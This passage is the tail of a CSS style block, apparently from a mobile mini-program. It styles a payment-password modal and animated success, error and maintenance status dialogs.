  line-height: 1.5;
}

/* ========== 支付密码弹窗 ========== */
.account-info-section {
  margin-bottom: 32rpx;
}

.section-label {
  display: block;
  font-size: 26rpx;
  color: #718096;
  margin-bottom: 12rpx;
  font-weight: 600;
}

.account-info-box {
  background: #f0f7ff;
  border: 2rpx solid #b3d4f0;
  border-radius: 12rpx;
  padding: 24rpx;
}

.account-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16rpx;
}

.account-row:last-child {
  margin-bottom: 0;
}

.account-label {
  font-size: 26rpx;
  color: #718096;
}

.account-value {
  font-size: 28rpx;
  font-weight: 600;
  color: #2D3748;
}

.password-input-section {
  margin-bottom: 24rpx;
}

.security-notice {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #e6f3ff;
  border-radius: 12rpx;
  border: 1rpx solid #b3d4f0;
}

.notice-icon {
  font-size: 40rpx;
  color: #005caa;
}

.shield-icon {
  font-size: 40rpx;
}

.notice-content {
  flex: 1;
}

.notice-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #005caa;
  margin-bottom: 8rpx;
}

.notice-text {
  display: block;
  font-size: 24rpx;
  color: #0d5cab;
  line-height: 1.5;
}

/* ========== 弹窗按钮 ========== */
.modal-actions {
  display: flex;
  gap: 16rpx;
}

.modal-button {
  flex: 1;
  height: 88rpx;
  background: linear-gradient(135deg, #005caa 0%, #0094d5 100%);
  border-radius: 12rpx;
  font-size: 30rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  box-shadow: 0 4rpx 12rpx rgba(0, 92, 170, 0.3);
}

.modal-button::after {
  border: none;
}

.confirm-button {
  background: linear-gradient(135deg, #005caa 0%, #0094d5 100%);
}

/* ========== 简单弹窗 ========== */
.simple-modal {
  text-align: center;
  padding: 60rpx 48rpx 48rpx;
}

.simple-modal .modal-title {
  font-size: 32rpx;
  margin-bottom: 24rpx;
}

/* ========== 状态弹窗（成功/失败/维护） ========== */
.status-overlay {
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(8rpx);
  align-items: flex-end;
}

.status-modal {
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 60rpx 48rpx 48rpx;
  width: 100%;
  text-align: center;
  animation: slideUp 0.3s ease;
}

.status-icon-container {
  margin-bottom: 32rpx;
  display: flex;
  justify-content: center;
}

.status-icon-circle {
  width: 128rpx;
  height: 128rpx;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 64rpx;
  animation: statusIconScale 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

@keyframes statusIconScale {
  0% {
    transform: scale(0);
    opacity: 0;
  }
  50% {
    transform: scale(1.1);
  }
  100% {
    transform: scale(1);
    opacity: 1;
  }
}

.success-circle {
  background: linear-gradient(135deg, #10B981 0%, #059669 100%);
  box-shadow: 0 8rpx 24rpx rgba(16, 185, 129, 0.3);
  color: #FFFFFF;
}

.error-circle {
  background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
  box-shadow: 0 8rpx 24rpx rgba(239, 68, 68, 0.3);
  color: #FFFFFF;
}

.maintenance-circle {
  background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
  box-shadow: 0 8rpx 24rpx rgba(245, 158, 11, 0.3);
  color: #FFFFFF;
}

.success-check,
.error-x,
.maintenance-icon {
  font-weight: 700;
}

.status-content {
  margin-bottom: 40rpx;
}

.status-title {
  display: block;
  font-size: 40rpx;
  font-weight: 700;
  margin-bottom: 16rpx;
}

.success-title {
  color: #10B981;
}

.error-title {
  color: #EF4444;
}

.maintenance-title {
  color: #F59E0B;
}

.status-message {
  display: block;
  font-size: 30rpx;
  color: #2D3748;
  margin-bottom: 12rpx;
  font-weight: 600;
}

.status-description {
  display: block;
  font-size: 26rpx;
  color: #718096;
  line-height: 1.6;
}

.status-button {
  width: 100%;
  height: 96rpx;
  border-radius: 16rpx;
  font-size: 32rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.status-button::after {
  border: none;
}

.success-button {
  background: linear-gradient(135deg, #10B981 0%, #059669 100%);
  box-shadow: 0 4rpx 12rpx rgba(16, 185, 129, 0.3);
}

.error-button {
  background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
  box-shadow: 0 4rpx 12rpx rgba(239, 68, 68, 0.3);
}

.maintenance-button {
  background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
  box-shadow: 0 4rpx 12rpx rgba(245, 158, 11, 0.3);
}
</style>
